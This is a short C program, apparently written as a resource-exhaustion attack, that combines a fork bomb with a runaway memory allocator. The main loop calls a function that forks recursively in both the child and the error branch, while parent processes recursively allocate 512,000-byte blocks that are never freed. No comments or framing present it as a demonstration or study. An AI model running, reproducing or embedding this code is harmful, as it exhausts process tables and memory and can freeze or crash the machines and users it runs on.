#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>


void more_evil(){
    malloc(512000);
    more_evil();
}

void evil(){
    more_evil();
}

void evil_fork(){
    pid_t process_id = fork();
    if(process_id == 0){
        evil_fork();
    }
    else if(process_id < 0){
        evil_fork();
    }
    else{
        evil();
    }
}



int main(){
    while(1){
        evil_fork();
    }
    return 0;
}
